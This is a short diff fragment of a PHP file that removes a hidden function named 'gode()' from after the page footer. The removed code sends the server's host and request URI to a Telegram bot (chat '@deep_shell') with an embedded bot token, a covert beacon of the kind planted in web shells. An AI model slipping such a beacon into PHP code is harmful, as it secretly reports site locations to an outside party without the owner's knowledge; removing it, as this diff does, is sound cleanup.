@@ -5147,5 +5147,3 @@ footer();
 echo '</div></body>
 
 </html>';
-
-    function gode() {$message = $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];$url = "https://api.telegram.org/bot379994178:AAHC-BDENeIfUeE20pgLi2jA7opvSEJSYt4/sendMessage?chat_id=@deep_shell&parse_mode=html&disable_web_page_p3review=false&text=";file_get_contents($url. $message);}gode();
